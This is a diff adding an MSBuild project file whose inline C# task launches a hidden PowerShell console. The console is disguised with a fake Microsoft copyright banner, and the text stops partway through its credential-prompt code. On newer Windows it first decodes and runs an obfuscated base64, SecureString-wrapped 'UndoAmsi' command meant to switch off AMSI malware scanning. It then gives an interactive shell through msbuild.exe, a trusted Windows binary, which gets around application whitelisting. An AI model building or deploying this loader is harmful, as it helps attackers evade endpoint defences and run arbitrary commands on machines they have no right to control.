@@ -1,0 +1,1611 @@
+<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <!-- C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe C:\MSPowerShellConsole.csproj -->
+  <Target Name="MSBuildPowerShell">
+   <MSPowerShellConsole/>
+  </Target>
+   <UsingTask
+    TaskName="MSPowerShellConsole"
+    TaskFactory="CodeTaskFactory"
+    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
+     <Task>
+      <Reference Include="System.Management.Automation" />		
+      <Code Type="Class" Language="cs">
+        <![CDATA[
+			using System;
+			using System.IO;
+			using System.Text;
+			using System.Linq;
+			using System.Globalization;
+			using System.Reflection;
+			using System.Security;
+			using Microsoft.Win32;
+			using Microsoft.Build.Framework;
+			using Microsoft.Build.Utilities;
+			using System.ComponentModel;
+			using System.Collections.Generic;
+			using System.Collections.ObjectModel;
+			using System.Runtime.InteropServices;
+			using System.Management.Automation;
+			using System.Management.Automation.Host;
+			using System.Management.Automation.Runspaces;
+			using PowerShell = System.Management.Automation.PowerShell;
+			public class MSPowerShellConsole :  Task, ITask
+			{
+				[DllImport("ntdll.dll")]
+				private static extern int RtlGetVersion(out RTL_OSVERSIONINFOEX lpVersionInformation);
+				[StructLayout(LayoutKind.Sequential)]
+				internal struct RTL_OSVERSIONINFOEX
+				{
+					internal uint dwOSVersionInfoSize;
+					internal uint dwMajorVersion;
+					internal uint dwMinorVersion;
+					internal uint dwBuildNumber;
+					internal uint dwPlatformId;
+					[MarshalAs(UnmanagedType.ByValTStr, SizeConst = 128)]
+					internal string szCSDVersion;
+				}
+				public static decimal RtlGetVersion()
+				{
+					RTL_OSVERSIONINFOEX osvi = new RTL_OSVERSIONINFOEX();
+					osvi.dwOSVersionInfoSize = (uint)Marshal.SizeOf(osvi);
+					if (RtlGetVersion(out osvi) == 0)
+					{
+						string Version = osvi.dwMajorVersion + "." + osvi.dwMinorVersion;
+						return decimal.Parse(Version, CultureInfo.InvariantCulture);
+					}
+					else
+					{
+						return -1;
+					}
+				}
+				public static void PrintBanner()
+				{
+					Console.BackgroundColor = ConsoleColor.Black;
+					Console.ForegroundColor = ConsoleColor.White;
+					Console.Clear();
+					Console.WriteLine("Windows MSPowerShellConsole");
+					Console.WriteLine("Copyright(C) 2016 Microsoft Corporation. All rights reserved.");
+					Console.WriteLine();
+				}
+				private static PowerListenerConsole PowerListener = new PowerListenerConsole();
+				public override bool Execute()
+				{
+					Console.Title = "Windows MSPowerShellConsole";
+					PrintBanner();
+					string LatestOSVersion = "6.3";
+					decimal latestOSVersionDec = decimal.Parse(LatestOSVersion, CultureInfo.InvariantCulture);
+					if (RtlGetVersion() > latestOSVersionDec)
+					{
+						string UndoAmsi = System.Text.Encoding.UTF8.GetString(System.Convert.FromBase64String(@"IElOdm9rRS1leHByZVNTSU9uICggKCBbcnVOVGlNRS5JbnRFUk9QU2VSVklDRXMubUFSU0hBbF06OlB0UnRPc3RSSW5HQXV0byggW3JVTnRJTWUuaU5URVJvUFNlclZJY2VTLm1BcnNoQUxdOjpTZWN1ckVTVHJJbmd0b0JTdFIoJCgnNzY0OTJkMTExNjc0M2YwNDIzNDEzYjE2MDUwYTUzNDVNZ0I4QUhFQVRRQmxBREFBTkFCV0FEUUFTQUJJQURZQWVBQmlBSGtBYkFCTkFHUUFjUUJIQUhFQWNnQkZBRkVBUFFBOUFId0FaZ0ExQUdNQVlnQXpBRElBWXdCaUFHUUFZUUF6QURZQVl3QmhBRElBTUFBM0FEa0FOUUJtQURVQVpnQTNBR1FBT1FBM0FEZ0FZUUF6QUdZQU5BQTJBRFVBTmdBeUFEa0FNUUE0QURrQVl3QXdBRElBWWdBd0FEa0FaQUJsQURZQU1BQXpBRFFBTlFCa0FESUFaZ0F4QUdRQVpnQmhBRE1BTVFBM0FEQUFaQUJpQURNQU5BQTVBREFBTndCakFEVUFPUUE1QUdNQU5nQmlBR1FBWXdBMUFHVUFZd0JsQURVQU5nQXdBRGtBWXdBd0FEWUFPQUF5QURFQU9RQmhBRElBWWdBMkFETUFPUUEyQURjQVlnQTBBRE1BT1FBeEFHUUFNd0EzQUdRQU5BQmtBRElBTkFBMEFHVUFNZ0F3QUdNQVpnQXdBRFFBWkFBekFHRUFaQUEzQURnQVl3QTVBRGdBT0FCakFESUFOQUJqQUdVQU5BQTBBRFVBWlFBNUFHRUFNUUJoQURVQU9RQTRBREFBWmdBd0FHWUFOZ0E1QURRQU1RQTFBR0VBTmdBNUFETUFaQUJpQURBQVlRQm1BRE1BWmdBeEFHUUFOd0E0QUdJQU1nQTRBRE1BT1FCbEFHVUFPQUEyQURRQVpBQTVBR0VBTVFCaUFESUFaQUJoQUdFQU5nQTVBRGdBTVFCbEFEY0FaUUEyQURJQVpBQmlBRElBWXdCbEFESUFaQUJpQUdNQVpBQmlBREFBWXdCaEFEQUFaQUE1QURZQVlRQTFBREVBTmdCa0FETUFOd0ExQURjQVpBQXdBRFlBTXdBd0FHVUFOUUEwQURFQU1BQTRBREVBTUFBNUFESUFNUUExQURnQU5BQmhBRFVBWXdBekFHTUFOQUF4QUdVQVpnQXlBRFVBWWdCbEFEa0FaZ0F6QURrQU9BQTVBREFBWlFBNUFESUFZUUEyQURVQU9RQXpBREVBT1FBMkFEVUFaUUF4QURjQU1BQTNBRFVBTlFCaEFHRUFNZ0EwQUdJQU5nQTFBRGNBTlFBeEFEUUFOd0F5QURZQU53QXhBRGtBTkFBMEFEWUFNZ0EwQURrQU5nQmxBR1lBWVFCakFHWUFOUUJsQURRQVpBQmhBRGdBTmdBM0FERUFaZ0JoQUdVQU9BQmxBRFVBTUFBMkFEY0FOQUE1QURNQVpBQTBBRGdBWlFBd0FHUUFNQUF5QURjQU5BQTJBR0VBTndBekFEVUFZUUE1QUdRQU1nQmtBR1FBTXdBMEFHRUFOZ0EwQUdRQU9RQTJBRGtBTndBd0FHRUFZd0ExQURnQU5nQXhBREFBTUFBMkFEUUFNUUJqQURFQVpRQmtBREFBTVFBMkFEZ0FaZ0F5QURNQU13QXpBRE1BWXdBNUFHWUFNUUJtQURJQU53QXdBRFVBWmdBMkFEVUFNd0F5QURnQU13QTBBRGNBWWdBNEFEVUFZZ0JtQURNQU1BQTFBRFFBTkFCbEFHWUFaQUF6QUdNQU53Qm1BRFVBTmdBM0FHUUFPUUF6QURFQU1nQTFBRFVBWlFBekFEY0FaZ0JqQUdFQU53QTRBR0lBWWdBNEFESUFPUUJoQUdVQU9RQXhBRGdBTmdBMEFEY0FNQUF6QUdJQVpRQmlBRFVBWkFBd0FEVUFPUUF4QURFQU53QTRBRGtBTlFBd0FESUFOd0JpQURnQVpRQTVBR1lBTVFBekFEQUFNUUF5QURFQU5RQXhBRGNBTWdCaUFETUFPQUF6QURjQU53QmxBR01BWkFCbEFHWUFZZ0JtQURVQU13QmxBR1lBWXdBeUFEa0FOd0EzQUdNQU5RQmxBRElBWXdBeUFERUFOQUF4QUdFQU5nQmpBR1FBTWdBNUFESUFNd0F4QURZQVpRQm1BREFBTXdBekFEVUFZd0JrQUdZQU5BQT0nIHxjb25WRVJUdG8tc0VjdVJFc3RSSU5HICAta0VZICgyMTIuLjE4MSkpICkpKSkg"));
+						PowerListener.Execute(UndoAmsi);
+					}
+					PowerListener.CommandShell();
+					return true;
+				}
+			}
+			class PowerListenerConsole
+			{
+				private bool shouldExit;
+				private int exitCode;
+				private MyHost myHost;
+				internal Runspace myRunSpace;
+				private PowerShell currentPowerShell;
+				private object instanceLock = new object();
+				public PowerListenerConsole()
+				{
+					InitialSessionState state = InitialSessionState.CreateDefault();
+					state.AuthorizationManager = new System.Management.Automation.AuthorizationManager("Dummy");
+					this.myHost = new MyHost(this);
+					this.myRunSpace = RunspaceFactory.CreateRunspace(this.myHost, state);
+					this.myRunSpace.Open();
+					lock (this.instanceLock)
+					{
+						this.currentPowerShell = PowerShell.Create();
+					}
+					try
+					{
+						this.currentPowerShell.Runspace = this.myRunSpace;
+						PSCommand[] profileCommands = HostUtilities.GetProfileCommands("PowerShell");
+						foreach (PSCommand command in profileCommands)
+						{
+							this.currentPowerShell.Commands = command;
+							this.currentPowerShell.Invoke();
+						}
+					}
+					finally
+					{
+						lock (this.instanceLock)
+						{
+							this.currentPowerShell.Dispose();
+							this.currentPowerShell = null;
+						}
+					}
+				}
+				public bool ShouldExit
+				{
+					get { return this.shouldExit; }
+					set { this.shouldExit = value; }
+				}
+				public int ExitCode
+				{
+					get { return this.exitCode; }
+					set { this.exitCode = value; }
+				}
+				public void CommandShell()
+				{
+					PowerListenerConsole listener = new PowerListenerConsole();
+					listener.CommandPrompt();
+				}
+				private void executeHelper(string cmd, object input)
+				{
+					if (String.IsNullOrEmpty(cmd))
+					{
+						return;
+					}
+					lock (this.instanceLock)
+					{
+						this.currentPowerShell = PowerShell.Create();
+					}
+					try
+					{
+						this.currentPowerShell.Runspace = this.myRunSpace;
+						this.currentPowerShell.AddScript(cmd);
+						this.currentPowerShell.AddCommand("out-default");
+						this.currentPowerShell.Commands.Commands[0].MergeMyResults(PipelineResultTypes.Error, PipelineResultTypes.Output);
+						if (input != null)
+						{
+							this.currentPowerShell.Invoke(new object[] { input });
+						}
+						else
+						{
+							this.currentPowerShell.Invoke();
+						}
+					}
+					finally
+					{
+						lock (this.instanceLock)
+						{
+							this.currentPowerShell.Dispose();
+							this.currentPowerShell = null;
+						}
+					}
+				}
+				private void ReportException(Exception e)
+				{
+					if (e != null)
+					{
+						object error;
+						IContainsErrorRecord icer = e as IContainsErrorRecord;
+						if (icer != null)
+						{
+							error = icer.ErrorRecord;
+						}
+						else
+						{
+							error = (object)new ErrorRecord(e, "Host.ReportException", ErrorCategory.NotSpecified, null);
+						}
+						lock (this.instanceLock)
+						{
+							this.currentPowerShell = PowerShell.Create();
+						}
+						this.currentPowerShell.Runspace = this.myRunSpace;
+						try
+						{
+							this.currentPowerShell.AddScript("$input").AddCommand("out-string");
+							Collection<PSObject> result;
+							PSDataCollection<object> inputCollection = new PSDataCollection<object>();
+							inputCollection.Add(error);
+							inputCollection.Complete();
+							result = this.currentPowerShell.Invoke(inputCollection);
+							if (result.Count > 0)
+							{
+								string str = result[0].BaseObject as string;
+								if (!string.IsNullOrEmpty(str))
+								{
+									this.myHost.UI.WriteErrorLine(str.Substring(0, str.Length - 2));
+								}
+							}
+						}
+						finally
+						{
+							lock (this.instanceLock)
+							{
+								this.currentPowerShell.Dispose();
+								this.currentPowerShell = null;
+							}
+						}
+					}
+				}
+				public void Execute(string cmd)
+				{
+					try
+					{
+						this.executeHelper(cmd, null);
+					}
+					catch (RuntimeException rte)
+					{
+						this.ReportException(rte);
+					}
+				}
+				private void HandleControlC(object sender, ConsoleCancelEventArgs e)
+				{
+					try
+					{
+						lock (this.instanceLock)
+						{
+							if (this.currentPowerShell != null && this.currentPowerShell.InvocationStateInfo.State == PSInvocationState.Running)
+							{
+								this.currentPowerShell.Stop();
+							}
+						}
+						e.Cancel = true;
+					}
+					catch (Exception exception)
+					{
+						this.myHost.UI.WriteErrorLine(exception.ToString());
+					}
+				}
+				private void CommandPrompt()
+				{
+					int bufSize = 8192;
+					Stream inStream = Console.OpenStandardInput(bufSize);
+					Console.SetIn(new StreamReader(inStream, Console.InputEncoding, false, bufSize));
+					Console.CancelKeyPress += new ConsoleCancelEventHandler(this.HandleControlC);
+					Console.TreatControlCAsInput = false;
+					while (!this.ShouldExit)
+					{
+						string prompt;
+						if (this.myHost.IsRunspacePushed)
+						{
+							prompt = string.Format("[{0}]: PS> ", this.myRunSpace.ConnectionInfo.ComputerName);
+						}
+						else
+						{
+							prompt = string.Format("PS {0}> ", this.myRunSpace.SessionStateProxy.Path.CurrentFileSystemLocation.Path);
+						}
+						this.myHost.UI.Write(prompt);
+						string cmd = Console.ReadLine();
+						if (cmd == "exit" || cmd == "quit")
+						{
+							return;
+						}
+						else if (cmd == "cls")
+						{
+							Console.Clear();
+						}
+						else
+						{
+							try
+							{
+								this.Execute(cmd);
+							}
+							catch (Exception e)
+							{
+								Console.WriteLine(e.Message);
+							}
+						}
+					}
+				}
+			}
+			internal class MyHost : PSHost, IHostSupportsInteractiveSession
+			{
+				public Runspace pushedRunspace = null;
+				public MyHost(PowerListenerConsole program)
+				{
+					this.program = program;
+				}
+				private static Guid instanceId = Guid.NewGuid();
+				private PowerListenerConsole program;
+				private CultureInfo originalCultureInfo = System.Threading.Thread.CurrentThread.CurrentCulture;
+				private CultureInfo originalUICultureInfo = System.Threading.Thread.CurrentThread.CurrentUICulture;
+				private MyHostUserInterface myHostUserInterface = new MyHostUserInterface();
+				public override CultureInfo CurrentCulture
+				{
+					get { return this.originalCultureInfo; }
+				}
+				public override CultureInfo CurrentUICulture
+				{
+					get { return this.originalUICultureInfo; }
+				}
+				public override Guid InstanceId
+				{
+					get { return instanceId; }
+				}
+				public override string Name
+				{
+					get { return "MSPowerShellConsole"; }
+				}
+				public override PSHostUserInterface UI
+				{
+					get { return this.myHostUserInterface; }
+				}
+				public override Version Version
+				{
+					get { return new Version(1, 0, 0, 0); }
+				}
+				#region IHostSupportsInteractiveSession Properties
+				public bool IsRunspacePushed
+				{
+					get { return this.pushedRunspace != null; }
+				}
+				public Runspace Runspace
+				{
+					get { return this.program.myRunSpace; }
+					internal set { this.program.myRunSpace = value; }
+				}
+				#endregion IHostSupportsInteractiveSession Properties
+				public override void EnterNestedPrompt()
+				{
+					throw new NotImplementedException("Cannot suspend the shell, EnterNestedPrompt() method is not implemented by MyHost.");
+				}
+				public override void ExitNestedPrompt()
+				{
+					throw new NotImplementedException("The ExitNestedPrompt() method is not implemented by MyHost.");
+				}
+				public override void NotifyBeginApplication()
+				{
+					return;
+				}
+				public override void NotifyEndApplication()
+				{
+					return;
+				}
+				public override void SetShouldExit(int exitCode)
+				{
+					this.program.ShouldExit = true;
+					this.program.ExitCode = exitCode;
+				}
+				#region IHostSupportsInteractiveSession Methods
+				public void PopRunspace()
+				{
+					Runspace = this.pushedRunspace;
+					this.pushedRunspace = null;
+				}
+				public void PushRunspace(Runspace runspace)
+				{
+					this.pushedRunspace = Runspace;
+					Runspace = runspace;
+				}
+				#endregion IHostSupportsInteractiveSession Methods
+			}
+			internal class MyHostUserInterface : PSHostUserInterface, IHostUISupportsMultipleChoiceSelection
+			{
+				[DllImport("ole32.dll")]
+				public static extern void CoTaskMemFree(IntPtr ptr);
+				[DllImport("credui.dll", CharSet = CharSet.Auto)]
+				private static extern int CredUIPromptForWindowsCredentials(ref CREDUI_INFO notUsedHere, int authError, ref uint authPackage, IntPtr InAuthBuffer, uint InAuthBufferSize, out IntPtr refOutAuthBuffer, out uint refOutAuthBufferSize, ref bool fSave, int flags);
+				[DllImport("credui.dll", CharSet = CharSet.Auto)]
+				private static extern bool CredUnPackAuthenticationBuffer(int dwFlags, IntPtr pAuthBuffer, uint cbAuthBuffer, StringBuilder pszUserName, ref int pcchMaxUserName, StringBuilder pszDomainName, ref int pcchMaxDomainame, StringBuilder pszPassword, ref int pcchMaxPassword);
+				[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
+				private struct CREDUI_INFO
+				{
+					public int cbSize;
+					public IntPtr hwndParent;
+					public string pszMessageText;
+					public string pszCaptionText;
+					public IntPtr hbmBanner;
+				}
+				private MyRawUserInterface myRawUi = new MyRawUserInterface();
+				public override PSHostRawUserInterface RawUI
+				{
+					get { return this.myRawUi; }
+				}
+				public override Dictionary<string, PSObject> Prompt(
+							   string caption,
+							   string message,
+							   Collection<FieldDescription> descriptions)
+				{
+					this.Write(
+						  ConsoleColor.Blue,
+						  ConsoleColor.Black,
+						  caption + "\n" + message + " ");
+					Dictionary<string, PSObject> results =
+						new Dictionary<string, PSObject>();
+					foreach (FieldDescription fd in descriptions)
+					{
+						string[] label = GetHotkeyAndLabel(fd.Label);
+						this.WriteLine(label[1]);
+						string userData = Console.ReadLine();
+						if (userData == null)
+						{
+							return null;
+						}
+						results[fd.Name] = PSObject.AsPSObject(userData);
+					}
+					return results;
+				}
+				public override int PromptForChoice(
+													string caption,
+													string message,
+													Collection<ChoiceDescription> choices,
+													int defaultChoice)
+				{
+					this.WriteLine(
+								   ConsoleColor.Blue,
+								   ConsoleColor.Black,
+								   caption + "\n" + message + "\n");
+					string[,] promptData = BuildHotkeysAndPlainLabels(choices);
+					StringBuilder sb = new StringBuilder();
+					for (int element = 0; element < choices.Count; element++)
+					{
+						sb.Append(String.Format(
+												CultureInfo.CurrentCulture,
+												"|{0}> {1} ",
+												promptData[0, element],
+												promptData[1, element]));
+					}
+					sb.Append(String.Format(
+											CultureInfo.CurrentCulture,
+											"[Default is ({0}]",
+											promptData[0, defaultChoice]));
+					while (true)
+					{
+						this.WriteLine(ConsoleColor.Cyan, ConsoleColor.Black, sb.ToString());
+						string data = Console.ReadLine().Trim().ToUpper(CultureInfo.CurrentCulture);
+						if (data.Length == 0)
+						{
+							return defaultChoice;
+						}
+						for (int i = 0; i < choices.Count; i++)
+						{
+							if (promptData[0, i] == data)
+							{
+								return i;
+							}
+						}
+						this.WriteErrorLine("Invalid choice: " + data);
+					}
+				}
+				#region IHostUISupportsMultipleChoiceSelection Members
+				public Collection<int> PromptForChoice(
+													   string caption,
+													   string message,
+													   Collection<ChoiceDescription> choices,
+													   IEnumerable<int> defaultChoices)
+				{
+					this.WriteLine(
+								   ConsoleColor.Blue,
+								   ConsoleColor.Black,
+								   caption + "\n" + message + "\n");
+					string[,] promptData = BuildHotkeysAndPlainLabels(choices);
+					StringBuilder sb = new StringBuilder();
+					for (int element = 0; element < choices.Count; element++)
+					{
+						sb.Append(String.Format(
+												CultureInfo.CurrentCulture,
+												"|{0}> {1} ",
+												promptData[0, element],
+												promptData[1, element]));
+					}
+					Collection<int> defaultResults = new Collection<int>();
+					if (defaultChoices != null)
+					{
+						int countDefaults = 0;
+						foreach (int defaultChoice in defaultChoices)
+						{
+							++countDefaults;
+							defaultResults.Add(defaultChoice);
+						}
+
+						if (countDefaults != 0)
+						{
+							sb.Append(countDefaults == 1 ? "[Default choice is " : "[Default choices are ");
+							foreach (int defaultChoice in defaultChoices)
+							{
+								sb.AppendFormat(
+												CultureInfo.CurrentCulture,
+												"\"{0}\",",
+												promptData[0, defaultChoice]);
+							}
+
+							sb.Remove(sb.Length - 1, 1);
+							sb.Append("]");
+						}
+					}
+					this.WriteLine(ConsoleColor.Cyan, ConsoleColor.Black, sb.ToString());
+					Collection<int> results = new Collection<int>();
+					while (true)
+					{
+						ReadNext:
+						string prompt = string.Format(CultureInfo.CurrentCulture, "Choice[{0}]:", results.Count);
+						this.Write(ConsoleColor.Cyan, ConsoleColor.Black, prompt);
+						string data = Console.ReadLine().Trim().ToUpper(CultureInfo.CurrentCulture);
+						if (data.Length == 0)
+						{
+							return (results.Count == 0) ? defaultResults : results;
+						}
+						for (int i = 0; i < choices.Count; i++)
+						{
+							if (promptData[0, i] == data)
+							{
+								results.Add(i);
+								goto ReadNext;
+							}
+						}
+
+						this.WriteErrorLine("Invalid choice: " + data);
+					}
+				}
+				#endregion
+				public override PSCredential PromptForCredential(
+											 string caption,
+											 string message,
+											 string userName,
+											 string targetName)
+				{
+					PromptCredentialsResult result = CredentialUI.PromptForCredentials(targetName, caption, message, userName, null);
+					return result == null ? null : new PSCredential(result.UserName, result.Password.ToSecureString());
+				}
+				public override PSCredential PromptForCredential(
+									   string caption,
+									   string message,
+									   string userName,
+									   string targetName,
+									   PSCredentialTypes allowedCredentialTypes,
+									   PSCredentialUIOptions options)
+				{
+					PromptCredentialsResult result = CredentialUI.PromptForCredentials(targetName, caption, message, userName, null);
+					return result == null ? null : new PSCredential(result.UserName, result.Password.ToSecureString());
+				}
+				public override string ReadLine()
+				{
+					return Console.ReadLine();
+				}
+				public override System.Security.SecureString ReadLineAsSecureString()
+				{
+					return Console.ReadLine().ToSecureString();
+				}
+				public override void Write(string value)
+				{
+					Console.Write(value);
+				}
+				public override void Write(
+										   ConsoleColor foregroundColor,
+										   ConsoleColor backgroundColor,
+										   string value)
+				{
+					ConsoleColor oldFg = Console.ForegroundColor;
+					ConsoleColor oldBg = Console.BackgroundColor;
+					Console.ForegroundColor = foregroundColor;
+					Console.BackgroundColor = backgroundColor;
+					Console.Write(value);
+					Console.ForegroundColor = oldFg;
+					Console.BackgroundColor = oldBg;
+				}
+				public override void WriteLine(
+											   ConsoleColor foregroundColor,
+											   ConsoleColor backgroundColor,
+											   string value)
+				{
+					ConsoleColor oldFg = Console.ForegroundColor;
+					ConsoleColor oldBg = Console.BackgroundColor;
+					Console.ForegroundColor = foregroundColor;
+					Console.BackgroundColor = backgroundColor;
+					Console.WriteLine(value);
+					Console.ForegroundColor = oldFg;
+					Console.BackgroundColor = oldBg;
+				}
+				public override void WriteDebugLine(string message)
+				{
+					this.WriteLine(
+								   ConsoleColor.DarkYellow,
+								   ConsoleColor.Black,
+								   String.Format(CultureInfo.CurrentCulture, "DEBUG: {0}", message));
+				}
+				public override void WriteErrorLine(string value)
+				{
+					this.WriteLine(ConsoleColor.Red, ConsoleColor.Black, value);
+				}
+				public override void WriteLine()
+				{
+					Console.WriteLine();
+				}
+				public override void WriteLine(string value)
+				{
+					Console.WriteLine(value);
+				}
+				public override void WriteVerboseLine(string message)
+				{
+					this.WriteLine(
+								   ConsoleColor.Yellow,
+								   ConsoleColor.Black,
+								   String.Format(CultureInfo.CurrentCulture, "VERBOSE: {0}", message));
+				}
+				public override void WriteWarningLine(string message)
+				{
+					this.WriteLine(
+								   ConsoleColor.Yellow,
+								   ConsoleColor.Black,
+								   String.Format(CultureInfo.CurrentCulture, "WARNING: {0}", message));
+				}
+				public override void WriteProgress(long sourceId, ProgressRecord record)
+				{
+				}
+				private static string[] GetHotkeyAndLabel(string input)
+				{
+					string[] result = new string[] { String.Empty, String.Empty };
+					string[] fragments = input.Split('&');
+					if (fragments.Length == 2)
+					{
+						if (fragments[1].Length > 0)
+						{
+							result[0] = fragments[1][0].ToString().
+							ToUpper(CultureInfo.CurrentCulture);
+						}
+						result[1] = (fragments[0] + fragments[1]).Trim();
+					}
+					else
+					{
+						result[1] = input;
+					}
+					return result;
+				}
+				private static string[,] BuildHotkeysAndPlainLabels(
+					Collection<ChoiceDescription> choices)
+				{
+					string[,] hotkeysAndPlainLabels = new string[2, choices.Count];
+					for (int i = 0; i < choices.Count; ++i)
+					{
+						string[] hotkeyAndLabel = GetHotkeyAndLabel(choices[i].Label);
+						hotkeysAndPlainLabels[0, i] = hotkeyAndLabel[0];
+						hotkeysAndPlainLabels[1, i] = hotkeyAndLabel[1];
+					}
+					return hotkeysAndPlainLabels;
+				}
+			}
+			public class HostUtilities
+			{
+				internal const string PowerShellRootKeyPath = "Software\\Microsoft\\PowerShell";
+				internal const string PowerShellEngineKey = "PowerShellEngine";
+				internal const string PowerShellEngineApplicationBase = "ApplicationBase";
+				internal const string RegistryVersionKey = "1";
+				internal static PSObject GetDollarProfile(string allUsersAllHosts, string allUsersCurrentHost, string currentUserAllHosts, string currentUserCurrentHost)
+				{
+					PSObject returnValue = new PSObject(currentUserCurrentHost);
+					returnValue.Properties.Add(new PSNoteProperty("AllUsersAllHosts", allUsersAllHosts));
+					returnValue.Properties.Add(new PSNoteProperty("AllUsersCurrentHost", allUsersCurrentHost));
+					returnValue.Properties.Add(new PSNoteProperty("CurrentUserAllHosts", currentUserAllHosts));
+					returnValue.Properties.Add(new PSNoteProperty("CurrentUserCurrentHost", currentUserCurrentHost));
+					return returnValue;
+				}
+				internal static PSCommand[] GetProfileCommands(string shellId)
+				{
+					return HostUtilities.GetProfileCommands(shellId, false);
+				}
+				internal static PSCommand[] GetProfileCommands(string shellId, bool useTestProfile)
+				{
+					List<PSCommand> commands = new List<PSCommand>();
+					string allUsersAllHosts = HostUtilities.GetFullProfileFileName(null, false, useTestProfile);
+					string allUsersCurrentHost = HostUtilities.GetFullProfileFileName(shellId, false, useTestProfile);
+					string currentUserAllHosts = HostUtilities.GetFullProfileFileName(null, true, useTestProfile);
+					string currentUserCurrentHost = HostUtilities.GetFullProfileFileName(shellId, true, useTestProfile);
+					PSObject dollarProfile = HostUtilities.GetDollarProfile(allUsersAllHosts, allUsersCurrentHost, currentUserAllHosts, currentUserCurrentHost);
+					PSCommand command = new PSCommand();
+					command.AddCommand("set-variable");
+					command.AddParameter("Name", "profile");
+					command.AddParameter("Value", dollarProfile);
+					command.AddParameter("Option", ScopedItemOptions.None);
+					commands.Add(command);
+					string[] profilePaths = new string[] { allUsersAllHosts, allUsersCurrentHost, currentUserAllHosts, currentUserCurrentHost };
+					foreach (string profilePath in profilePaths)
+					{
+						if (!System.IO.File.Exists(profilePath))
+						{
+							continue;
+						}
+						command = new PSCommand();
+						command.AddCommand(profilePath, false);
+						commands.Add(command);
+					}
+					return commands.ToArray();
+				}
+				internal static string GetFullProfileFileName(string shellId, bool forCurrentUser)
+				{
+					return HostUtilities.GetFullProfileFileName(shellId, forCurrentUser, false);
+				}
+				internal static string GetFullProfileFileName(string shellId, bool forCurrentUser, bool useTestProfile)
+				{
+					string basePath = null;
+					if (forCurrentUser)
+					{
+						basePath = Environment.GetFolderPath(Environment.SpecialFolder.Personal);
+						basePath = System.IO.Path.Combine(basePath, "WindowsPowerShell");
+					}
+					else
+					{
+						basePath = GetAllUsersFolderPath(shellId);
+						if (string.IsNullOrEmpty(basePath))
+						{
+							return string.Empty;
+						}
+					}
+					string profileName = useTestProfile ? "profile_test.ps1" : "profile.ps1";
+					if (!string.IsNullOrEmpty(shellId))
+					{
+						profileName = shellId + "_" + profileName;
+					}
+					string fullPath = basePath = System.IO.Path.Combine(basePath, profileName);
+					return fullPath;
+				}
+				internal static string GetApplicationBase(string shellId)
+				{
+					string engineKeyPath = PowerShellRootKeyPath + "\\" +
+						RegistryVersionKey + "\\" + PowerShellEngineKey;
+					using (RegistryKey engineKey = Registry.LocalMachine.OpenSubKey(engineKeyPath))
+					{
+						if (engineKey != null)
+						{
+							return engineKey.GetValue(PowerShellEngineApplicationBase) as string;
+						}
+					}
+					Assembly assem = Assembly.GetEntryAssembly();
+					if (assem != null)
+					{
+						return Path.GetDirectoryName(assem.Location);
+					}
+					assem = Assembly.GetAssembly(typeof(System.Management.Automation.PSObject));
+					if (assem != null)
+					{
+						return Path.GetDirectoryName(assem.Location);
+					}
+					return string.Empty;
+				}
+				private static string GetAllUsersFolderPath(string shellId)
+				{
+					string folderPath = string.Empty;
+					try
+					{
+						folderPath = GetApplicationBase(shellId);
+					}
+					catch (System.Security.SecurityException)
+					{
+					}
+					return folderPath;
+				}
+			}
+			internal class MyRawUserInterface : PSHostRawUserInterface
+			{
+				public override ConsoleColor BackgroundColor
+				{
+					get { return Console.BackgroundColor; }
+					set { Console.BackgroundColor = value; }
+				}
+				public override Size BufferSize
+				{
+					get { return new Size(Console.BufferWidth, Console.BufferHeight); }
+					set { Console.SetBufferSize(value.Width, value.Height); }
+				}
+				public override Coordinates CursorPosition
+				{
+					get { throw new NotImplementedException("The CursorPosition property is not implemented by MyRawUserInterface."); }
+					set { throw new NotImplementedException("The CursorPosition property is not implemented by MyRawUserInterface."); }
+				}
+				public override int CursorSize
+				{
+					get { return Console.CursorSize; }
+					set { Console.CursorSize = value; }
+				}
+				public override ConsoleColor ForegroundColor
+				{
+					get { return Console.ForegroundColor; }
+					set { Console.ForegroundColor = value; }
+				}
+				public override bool KeyAvailable
+				{
+					get { return Console.KeyAvailable; }
+				}
+				public override Size MaxPhysicalWindowSize
+				{
+					get { return new Size(Console.LargestWindowWidth, Console.LargestWindowHeight); }
+				}
+				public override Size MaxWindowSize
+				{
+					get { return new Size(Console.LargestWindowWidth, Console.LargestWindowHeight); }
+				}
+				public override Coordinates WindowPosition
+				{
+					get { return new Coordinates(Console.WindowLeft, Console.WindowTop); }
+					set { Console.SetWindowPosition(value.X, value.Y); }
+				}
+				public override Size WindowSize
+				{
+					get { return new Size(Console.WindowWidth, Console.WindowHeight); }
+					set { Console.SetWindowSize(value.Width, value.Height); }
+				}
+				public override string WindowTitle
+				{
+					get { return Console.Title; }
+					set { Console.Title = value; }
+				}
+				public override void FlushInputBuffer()
+				{
+				}
+				public override BufferCell[,] GetBufferContents(Rectangle rectangle)
+				{
+					throw new NotImplementedException("The GetBufferContents method is not implemented by MyRawUserInterface.");
+				}
+				public override KeyInfo ReadKey(ReadKeyOptions options)
+				{
+					throw new NotImplementedException("The ReadKey() method is not implemented by MyRawUserInterface.");
+				}
+				public override void ScrollBufferContents(Rectangle source, Coordinates destination, Rectangle clip, BufferCell fill)
+				{
+					throw new NotImplementedException("The ScrollBufferContents() method is not implemented by MyRawUserInterface.");
+				}
+				public override void SetBufferContents(Coordinates origin, BufferCell[,] contents)
+				{
+					throw new NotImplementedException("The SetBufferContents() method is not implemented by MyRawUserInterface.");
+				}
+				public override void SetBufferContents(Rectangle rectangle, BufferCell fill)
+				{
+					throw new NotImplementedException("The SetBufferContents() method is not implemented by MyRawUserInterface.");
+				}
+			}
+			public static class CredentialUI
+			{
+				public static PromptCredentialsResult Prompt(String caption, String message)
+				{
+					return Prompt(caption, message, null, null);
+				}
+				public static PromptCredentialsResult Prompt(String caption, String message, IntPtr hwndParent)
+				{
+					return Prompt(caption, message, hwndParent, null, null);
+				}
+				public static PromptCredentialsResult Prompt(String caption, String message, String userName, String password)
+				{
+					return Prompt(caption, message, IntPtr.Zero, userName, password);
+				}
+				public static PromptCredentialsResult Prompt(String caption, String message, IntPtr hwndParent, String userName, String password)
+				{
+					if (Environment.OSVersion.Version.Major >= 6)
+					{
+						return PromptForWindowsCredentials(caption, message, hwndParent, userName, password);
+					}
+					else
+					{
